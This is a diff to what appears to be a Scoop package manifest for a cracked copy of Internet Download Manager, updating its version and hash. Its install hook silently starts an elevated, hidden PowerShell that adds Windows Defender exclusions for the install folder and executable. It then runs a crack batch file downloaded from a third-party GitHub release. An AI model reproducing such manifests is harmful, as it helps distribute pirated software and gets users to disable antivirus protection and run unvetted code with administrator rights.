@@ -1,17 +1,16 @@
 {
-	"version": "6.41.15",
+	"version": "6.41.20",
 	"description": "cracked version of IDM",
 	"homepage": "https://www.wotianna.com/idmpc/",
 	"url": "https://github.com/chenguang217/bucketFiles/releases/download/1.0/IDM.7z",
-	"hash": "md5:e52c953ccc528eca82bf17cc99d2e1f5",
+	"hash": "md5:d4f4f8f16492d1b59fd515bd18fdd964",
 	"extract_dir": "IDM/Bin",
 	"pre_install": [
-		"Start-Process powershell \"Add-MpPreference -ExclusionPath $dir;Add-MpPreference -ExclusionPath $dir\\IDMan.exe;$dir\\``!``)绿化.bat\" -Verb RunAs -WindowStyle hidden -wait"
-		
+		"Start-Process powershell \"Add-MpPreference -ExclusionPath $dir;Add-MpPreference -ExclusionPath $dir\\IDMan.exe;$dir\\``!``)\u7eff\u5316.bat\" -Verb RunAs -WindowStyle hidden -wait"
 	],
 	"uninstaller": {
 		"script": [
-			"Start-Process powershell \"$dir\\``!``)卸载.bat;Remove-MpPreference -ExclusionPath $dir;Remove-MpPreference -ExclusionPath $dir\\IDMan.exe\" -Verb RunAs -WindowStyle hidden -wait"
+			"Start-Process powershell \"$dir\\``!``)\u5378\u8f7d.bat;Remove-MpPreference -ExclusionPath $dir;Remove-MpPreference -ExclusionPath $dir\\IDMan.exe\" -Verb RunAs -WindowStyle hidden -wait"
 		]
 	},
 	"shortcuts": [
